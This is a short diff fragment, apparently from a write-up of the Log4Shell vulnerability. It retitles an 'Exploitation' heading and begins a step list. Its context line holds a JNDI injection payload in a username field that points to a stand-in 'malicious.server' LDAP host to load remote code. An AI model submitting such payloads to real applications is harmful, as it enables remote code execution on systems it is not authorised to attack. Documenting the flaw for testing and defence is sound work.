@@ -99,7 +99,7 @@ Username: ${jndi:ldap://malicious.server/Exploit}
 
 
 
-# Exploitation:    
+# Exploitation Procedure/Steps:    
 
 1) Visit the vulnerable webapplication via url.
 
